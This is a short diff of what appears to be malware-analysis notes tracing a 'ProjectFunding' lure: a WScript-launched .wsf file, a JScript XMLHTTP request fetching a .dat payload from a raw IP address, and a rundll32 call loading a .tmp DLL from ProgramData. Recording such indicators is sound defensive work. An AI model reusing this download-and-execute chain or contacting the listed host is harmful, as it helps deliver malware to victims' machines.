@@ -2,7 +2,7 @@
 
 *************************************************
 
-.pdf 
+.pdf - ProjectFunding-1337
 .zip 
 .wsf 
 .dll 
@@ -13,7 +13,11 @@ Exec >
 
 WScript.exe C:\Users\Admin\AppData\Local\Temp\ProjectFunding_D428.wsf
 
-C:\\Windows\\SysWOW64\\rundll32.exe C:\ProgramData\azqahBwvGUK2Nl.tmp,Motd
+var http = new ActiveXObject("microsoft.xmlhttp");
+
+http.open("GET", "http://209.182.225.155/a5HxRD4YrAG3z.dat", false);
+
+rundll32.exe C:\ProgramData\azqahBwvGUK2Nl.tmp,Motd
 
 *************************************************
 
